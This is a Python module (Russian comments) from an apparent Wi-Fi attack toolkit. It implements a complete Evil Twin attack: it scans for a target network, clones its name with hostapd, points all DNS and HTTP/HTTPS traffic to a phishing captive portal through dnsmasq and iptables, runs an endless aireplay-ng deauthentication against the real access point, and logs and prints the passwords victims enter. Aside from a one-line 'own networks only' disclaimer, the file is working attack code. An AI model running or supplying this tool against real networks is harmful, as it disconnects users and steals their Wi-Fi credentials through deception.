"""Evil Twin: поддельная точка доступа с captive-порталом.

Сценарий (как в airgeddon «AP + captive portal»):
  1. выбрать целевую сеть (скан);
  2. выбрать/добавить HTML-шаблон портала (под своего оператора);
  3. выбрать, использовать ли 2-й адаптер для деаутентификации;
  4. поднять open-AP с тем же ESSID (hostapd), DHCP+DNS (dnsmasq),
     перенаправить весь HTTP на портал (iptables), запустить веб-портал;
  5. (опц.) 2-м адаптером глушить клиентов реальной сети, чтобы они
     перецеплялись на двойника;
  6. собрать введённые пароли (опц. сверяя с handshake через aircrack-ng).

Только для легального тестирования своих сетей.
"""

import os
import sys
import time
import shutil
import tempfile
import subprocess
from pathlib import Path

from . import iface
from .system import missing_tools
from .ui import ask_yes_no, pause
from .terminal import kill_group
from .netscan import scan_networks, choose_network, ask_scan_duration
from .constants import (
    TOOLS_EVIL_TWIN, BASE_DIR, EVIL_TWIN_DIR, PORTAL_TEMPLATES_DIR,
    PORTAL_BUILTIN_DIR, PORTAL_CAPTURED_FILE,
    AP_GATEWAY_IP, AP_NETMASK, AP_DHCP_START, AP_DHCP_END, PORTAL_PORT,
)


# ============ Шаблоны портала ============

def _template_dirs(base):
    if not base.exists():
        return []
    return sorted(d for d in base.iterdir()
                  if d.is_dir() and (d / "index.html").exists())


def list_templates():
    """Список шаблонов: [(name, path, source)]. source = 'встроенный'|'свой'."""
    out = []
    for d in _template_dirs(PORTAL_BUILTIN_DIR):
        out.append((d.name, d, "встроенный"))
    for d in _template_dirs(PORTAL_TEMPLATES_DIR):
        out.append((d.name, d, "свой"))
    return out


def _unique_template_dir(name):
    safe = "".join(c if (c.isalnum() or c in "-_.") else "_" for c in name) or "portal"
    dest = PORTAL_TEMPLATES_DIR / safe
    n = 1
    while dest.exists():
        dest = PORTAL_TEMPLATES_DIR / f"{safe}_{n}"
        n += 1
    return dest


def add_template():
    """Добавляет свой шаблон: .html-файл или папку (должна содержать index.html)."""
    raw = input("\nПуть к своему HTML-файлу или папке шаблона: ").strip()
    if not raw:
        return
    src = Path(raw).expanduser()
    if not src.exists():
        print(f"[-] Не найдено: {src}")
        return

    PORTAL_TEMPLATES_DIR.mkdir(parents=True, exist_ok=True)
    name = input("Название шаблона (например, altel): ").strip() or src.stem
    dest = _unique_template_dir(name)

    try:
        if src.is_dir():
            if not (src / "index.html").exists():
                print("[-] В папке нет index.html.")
                return
            shutil.copytree(src, dest)
        elif src.suffix.lower() in (".html", ".htm"):
            dest.mkdir(parents=True)
            shutil.copy2(src, dest / "index.html")
        else:
            print("[-] Ожидается .html файл или папка с index.html.")
            return
    except Exception as e:
        print(f"[-] Не удалось добавить шаблон: {e}")
        return

    print(f"[+] Шаблон добавлен: {dest.name}  ({dest})")
    print("    Подсказка: в index.html можно использовать плейсхолдеры "
          "{{ESSID}} и {{ERROR}}; форма должна слать POST с полем password.")


def choose_template():
    """Меню выбора шаблона портала. Возвращает Path к папке шаблона или None."""
    while True:
        templates = list_templates()
        print("\nШаблоны портала:")
        if not templates:
            print("  (встроенных нет — добавьте свой)")
        for i, (name, _path, source) in enumerate(templates, 1):
            print(f"  {i}. {name}  [{source}]")
        print("  a. Добавить свой HTML/шаблон")
        print("  0. Отмена")

        choice = input("Выбор шаблона: ").strip().lower()
        if choice == "0":
            return None
        if choice == "a":
            add_template()
            continue
        try:
            idx = int(choice) - 1
        except ValueError:
            print("Неизвестный пункт.")
            continue
        if 0 <= idx < len(templates):
            return templates[idx][1]
        print("Неизвестный пункт.")


# ============ Выбор адаптера атаки ============

def choose_attack_adapter(ap_interface):
    """
    Спрашивает, использовать ли 2-й адаптер для деаутентификации.
    Возвращает имя адаптера атаки или None (атака без 2-го адаптера не ведётся).
    """
    if not ask_yes_no("\n[?] Использовать 2-й адаптер для атаки (деаутентификация)?",
                       default=False):
        return None

    others = [i for i in iface.list_wifi_interfaces() if i != ap_interface]
    if not others:
        print("[-] Других Wi-Fi адаптеров не найдено. Атака не будет вестись.")
        return None

    print("\nВыберите адаптер для атаки:")
    for i, name in enumerate(others, 1):
        mode, _ = iface.get_wifi_info(name)
        print(f"  {i}. {name}  ({mode})")
    while True:
        choice = input("Адаптер для атаки (0 — без атаки): ").strip()
        if choice == "0":
            return None
        try:
            idx = int(choice) - 1
        except ValueError:
            print("Введите число.")
            continue
        if 0 <= idx < len(others):
            return others[idx]
        print(f"Введите число от 1 до {len(others)}.")


# ============ Низкоуровневые операции ============

def _run(cmd, **kw):
    kw.setdefault("stdout", subprocess.DEVNULL)
    kw.setdefault("stderr", subprocess.DEVNULL)
    return subprocess.run(cmd, **kw)


def _have(tool):
    return shutil.which(tool) is not None


def _hostapd_conf(path, ap_iface, essid, channel):
    hw_mode = "a" if channel.isdigit() and int(channel) > 14 else "g"
    path.write_text(
        f"interface={ap_iface}\n"
        f"driver=nl80211\n"
        f"ssid={essid}\n"
        f"hw_mode={hw_mode}\n"
        f"channel={channel}\n"
        f"auth_algs=1\n"
        f"ignore_broadcast_ssid=0\n"
    )
    return path


def _dnsmasq_conf(path, ap_iface):
    path.write_text(
        f"interface={ap_iface}\n"
        f"bind-interfaces\n"
        f"dhcp-range={AP_DHCP_START},{AP_DHCP_END},{AP_NETMASK},12h\n"
        f"dhcp-option=3,{AP_GATEWAY_IP}\n"      # шлюз
        f"dhcp-option=6,{AP_GATEWAY_IP}\n"      # DNS
        f"address=/#/{AP_GATEWAY_IP}\n"         # все домены -> портал
        f"no-resolv\n"
        f"log-queries\n"
    )
    return path


def _bg(cmd, log_path):
    """Запускает процесс в фоне, вывод в лог-файл, в своей группе процессов."""
    log = open(log_path, "w")
    return subprocess.Popen(cmd, stdout=log, stderr=subprocess.STDOUT,
                            preexec_fn=os.setsid)


# ============ Основной сценарий ============

def evil_twin_flow(ap_interface):
    missing = missing_tools(TOOLS_EVIL_TWIN)
    if missing:
        print(f"[-] Не найдены утилиты: {', '.join(missing)}")
        print("    Установите: sudo apt install hostapd dnsmasq iptables")
        return

    print("\n=== Evil Twin (поддельная точка доступа + портал) ===")
    print(f"[*] Адаптер точки доступа: {ap_interface}")

    # --- 1. Цель ---
    print("\n[1/4] Поиск целевой сети. Нужен monitor на этом адаптере для скана.")
    was_monitor = iface.get_interface_mode(ap_interface).lower() == "monitor"
    if not was_monitor:
        iface.set_monitor_mode(ap_interface)

    tmp_dir = Path(tempfile.mkdtemp(prefix="eviltwin_"))
    target = None
    try:
        duration = ask_scan_duration()
        networks = scan_networks(ap_interface, duration, tmp_dir)
        if not networks:
            print("[-] Сети не найдены.")
            return
        target = choose_network(networks)
    finally:
        if target is None:
            shutil.rmtree(tmp_dir, ignore_errors=True)
    if target is None:
        return

    essid = target["essid"] or ""
    bssid = target["bssid"]
    channel = target["channel"]
    if not essid:
        print("[-] У выбранной сети скрытый ESSID — для двойника нужно имя.")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    # --- 2. Шаблон портала ---
    print(f"\n[2/4] Выбор сайта-двойника для '{essid}'.")
    template = choose_template()
    if template is None:
        print("[*] Отменено.")
        shutil.rmtree(tmp_dir, ignore_errors=True)
        return

    # --- 3. Адаптер атаки ---
    print("\n[3/4] Деаутентификация клиентов реальной сети.")
    attack_iface = choose_attack_adapter(ap_interface)

    # --- 4. Проверка пароля по handshake (опционально) ---
    handshake = None
    if ask_yes_no("\n[?] Проверять введённый пароль по handshake (.cap)?", default=False):
        hs = input("Путь к .cap с handshake этой сети: ").strip()
        if hs and Path(hs).expanduser().exists():
            handshake = str(Path(hs).expanduser())
        else:
            print("[!] Файл не найден — пароли будут сохраняться без проверки.")

    _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
                  template, handshake, tmp_dir)


def _start_attack(ap_interface, attack_iface, target, essid, bssid, channel,
                  template, handshake, tmp_dir):
    procs = []            # (name, Popen)
    nmcli = _have("nmcli")
    ipt_backup = tmp_dir / "iptables.backup"
    changed_forward = False
    created_vif = None    # монитор-VIF для деаута одним адаптером

    print("\n[4/4] Запуск Evil Twin...")
    EVIL_TWIN_DIR.mkdir(parents=True, exist_ok=True)

    try:
        # --- Сохранить iptables и ip_forward ---
        if _have("iptables-save"):
            with open(ipt_backup, "w") as f:
                subprocess.run(["iptables-save"], stdout=f)

        # --- Подготовка AP-адаптера (hostapd хочет managed, не monitor) ---
        if nmcli:
            _run(["nmcli", "dev", "set", ap_interface, "managed", "no"])
        if _have("rfkill"):
            _run(["rfkill", "unblock", "wifi"])
        _run(["ip", "link", "set", ap_interface, "down"])
        _run(["iw", "dev", ap_interface, "set", "type", "managed"])
        _run(["ip", "link", "set", ap_interface, "up"])

        # --- hostapd ---
        hostapd_conf = _hostapd_conf(tmp_dir / "hostapd.conf",
                                     ap_interface, essid, channel)
        hostapd = _bg(["hostapd", str(hostapd_conf)], tmp_dir / "hostapd.log")
        procs.append(("hostapd", hostapd))
        time.sleep(3)
        if hostapd.poll() is not None:
            print("[-] hostapd не запустился. Лог:")
            print(_tail(tmp_dir / "hostapd.log"))
            raise RuntimeError("hostapd failed")

        # --- IP на AP-адаптере ---
        _run(["ip", "addr", "flush", "dev", ap_interface])
        _run(["ip", "addr", "add", f"{AP_GATEWAY_IP}/24", "dev", ap_interface])
        _run(["ip", "link", "set", ap_interface, "up"])

        # --- dnsmasq ---
        dnsmasq_conf = _dnsmasq_conf(tmp_dir / "dnsmasq.conf", ap_interface)
        # на всякий случай гасим системный dnsmasq, чтобы не держал порт 53
        _run(["pkill", "-f", "dnsmasq.*" + ap_interface])
        dnsmasq = _bg(["dnsmasq", "-d", "-C", str(dnsmasq_conf)],
                      tmp_dir / "dnsmasq.log")
        procs.append(("dnsmasq", dnsmasq))
        time.sleep(1)

        # --- iptables: весь HTTP(S) -> портал, без доступа в интернет ---
        _run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
        changed_forward = True
        _run(["iptables", "--flush"])
        _run(["iptables", "-t", "nat", "--flush"])
        _run(["iptables", "-P", "FORWARD", "ACCEPT"])
        for dport in ("80", "443"):
            _run(["iptables", "-t", "nat", "-A", "PREROUTING",
                  "-i", ap_interface, "-p", "tcp", "--dport", dport,
                  "-j", "DNAT", "--to-destination", f"{AP_GATEWAY_IP}:{PORTAL_PORT}"])

        # --- Веб-портал ---
        portal_cmd = [sys.executable, "-m", "wifitool.portal_server",
                      "--root", str(template), "--essid", essid,
                      "--creds", str(PORTAL_CAPTURED_FILE),
                      "--port", str(PORTAL_PORT)]
        if handshake:
            portal_cmd += ["--handshake", handshake, "--bssid", bssid]
        portal = subprocess.Popen(portal_cmd, cwd=str(BASE_DIR),
                                  preexec_fn=os.setsid)
        procs.append(("portal", portal))

        # --- Деаутентификация ---
        # 2 адаптера: 2-й независимо глушит реальную сеть.
        # 1 адаптер: создаём монитор-VIF на том же радио (как airgeddon) и
        # шлём deauth через него — на том же канале, что и AP (= канал цели).
        deauth_iface = None
        if attack_iface:
            iface.set_monitor_mode(attack_iface)
            iface.set_channel(attack_iface, channel)
            deauth_iface = attack_iface
        else:
            vif = iface.add_monitor_vif(ap_interface)
            if vif:
                created_vif = vif
                deauth_iface = vif
                print(f"[+] Монитор-интерфейс {vif} создан на том же адаптере.")
            else:
                print("[!] Драйвер не поддерживает AP + monitor одновременно —")
                print("    деаутентификация одним адаптером недоступна, нужен 2-й.")

        if deauth_iface:
            deauth = _bg(["aireplay-ng", "--deauth", "0", "-a", bssid, deauth_iface],
                         tmp_dir / "deauth.log")
            procs.append(("deauth", deauth))
            print(f"[+] Деаутентификация запущена ({deauth_iface}) по {bssid}.")

        _status(essid, bssid, channel, ap_interface, deauth_iface, template, handshake)
        _watch_credentials(procs)

    except KeyboardInterrupt:
        print("\n[*] Остановка Evil Twin...")
    except Exception as e:
        print(f"[-] Ошибка: {e}")
    finally:
        _cleanup(procs, ap_interface, attack_iface, nmcli,
                 ipt_backup if ipt_backup.exists() else None, changed_forward,
                 created_vif)
        _show_captured()
        shutil.rmtree(tmp_dir, ignore_errors=True)


def _status(essid, bssid, channel, ap_iface, attack_iface, template, handshake):
    print("\n" + "=" * 60)
    print("  EVIL TWIN РАБОТАЕТ")
    print("=" * 60)
    print(f"  Сеть-двойник : {essid}  (канал {channel})")
    print(f"  Реальный BSSID: {bssid}")
    print(f"  AP-адаптер    : {ap_iface}  ->  {AP_GATEWAY_IP}")
    print(f"  Атака         : {attack_iface or 'нет (1 адаптер)'}")
    print(f"  Портал        : {template.name}")
    print(f"  Проверка пароля: {'по handshake' if handshake else 'нет'}")
    print("=" * 60)
    print("  Ctrl+C — остановить и вернуть сеть в исходное состояние.")
    print("  Введённые пароли появляются ниже:\n")


def _watch_credentials(procs):
    """Ждёт Ctrl+C, попутно показывая новые строки из creds-файла."""
    last_size = PORTAL_CAPTURED_FILE.stat().st_size if PORTAL_CAPTURED_FILE.exists() else 0
    portal = dict(procs).get("portal")
    while True:
        time.sleep(1)
        # портал упал — выходим
        if portal is not None and portal.poll() is not None:
            print("[-] Портал остановился.")
            break
        if PORTAL_CAPTURED_FILE.exists():
            size = PORTAL_CAPTURED_FILE.stat().st_size
            if size > last_size:
                with open(PORTAL_CAPTURED_FILE, "r", encoding="utf-8",
                          errors="ignore") as f:
                    f.seek(last_size)
                    new = f.read()
                last_size = size
                sys_out = new.strip()
                if sys_out:
                    print(sys_out)


def _tail(path, n=15):
    try:
        with open(path, "r", errors="ignore") as f:
            return "".join(f.readlines()[-n:])
    except Exception:
        return "(лог недоступен)"


def _cleanup(procs, ap_iface, attack_iface, nmcli, ipt_backup, changed_forward,
             created_vif=None):
    print("\n[*] Останавливаю процессы и восстанавливаю сеть...")
    for name, proc in reversed(procs):
        kill_group(proc)

    # Удаляем монитор-VIF, если создавали (деаут одним адаптером).
    if created_vif:
        iface.del_interface(created_vif)

    # iptables
    _run(["iptables", "--flush"])
    _run(["iptables", "-t", "nat", "--flush"])
    if ipt_backup and _have("iptables-restore"):
        try:
            with open(ipt_backup) as f:
                subprocess.run(["iptables-restore"], stdin=f)
        except Exception:
            pass
    if changed_forward:
        _run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    # AP-адаптер
    _run(["ip", "addr", "flush", "dev", ap_iface])
    _run(["ip", "link", "set", ap_iface, "down"])
    _run(["iw", "dev", ap_iface, "set", "type", "managed"])
    _run(["ip", "link", "set", ap_iface, "up"])
    if nmcli:
        _run(["nmcli", "dev", "set", ap_iface, "managed", "yes"])

    # Адаптер атаки — вернуть в managed
    if attack_iface:
        iface.set_managed_mode(attack_iface)

    print("[+] Готово, сеть восстановлена.")


def _show_captured():
    if not PORTAL_CAPTURED_FILE.exists():
        return
    print("\n" + "=" * 60)
    print("  СОБРАННЫЕ ПАРОЛИ (всего из файла):")
    print("=" * 60)
    print(f"  Файл: {PORTAL_CAPTURED_FILE}")
    try:
        with open(PORTAL_CAPTURED_FILE, "r", encoding="utf-8", errors="ignore") as f:
            data = f.read().strip()
        print(data if data else "  (пусто)")
    except Exception:
        pass
